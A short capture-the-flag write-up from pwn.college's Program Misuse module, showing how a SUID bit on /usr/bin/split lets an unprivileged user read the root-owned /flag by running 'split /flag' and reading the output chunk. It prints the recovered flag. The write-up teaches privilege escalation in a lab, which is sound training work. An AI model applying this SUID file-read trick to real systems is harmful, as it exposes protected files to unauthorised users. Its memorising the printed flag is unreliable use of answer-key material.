---
layout: page
title: "Challenge Name: split"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/split`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/split
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/split
```

-The `s` in `-rws` indicates it's a SUID binary.
-`split` runs with **root privileges**.

## 🚀 Exploitation

The `split` command in Linux is used to divide a file into smaller chunks, either by:

- number of lines,

- byte size,

- number of pieces.

So,
```bash
split /flag
```
simply create files with 1000 lines per file, in our case it would simply just create a file containing our flag

Output:
```
ls 
xaa
cat xaa
pwn.college{ERFwaR7mfWZjdw0CB78tEoCU2sY.dhTNxwSM0IzMyEzW}
```

      
